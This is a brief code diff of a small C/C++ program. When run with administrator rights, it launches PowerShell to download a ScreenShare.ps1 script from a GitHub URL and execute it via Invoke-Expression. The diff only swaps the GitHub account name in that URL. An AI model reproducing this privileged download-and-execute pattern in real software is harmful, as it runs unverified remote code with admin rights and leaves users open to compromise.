@@ -15,7 +15,7 @@ bool isadmin() {
 }
 
 int main() {
-    const char* command = "cmd.exe /C powershell -Command \"Invoke-Expression (Invoke-RestMethod https://raw.githubusercontent.com/kkoralop/ScreenShare/main/ScreenShare.ps1)\"";
+    const char* command = "cmd.exe /C powershell -Command \"Invoke-Expression (Invoke-RestMethod https://raw.githubusercontent.com/Koraalop/ScreenShare/main/ScreenShare.ps1)\"";
 
     if (isadmin()) {
         system(command);
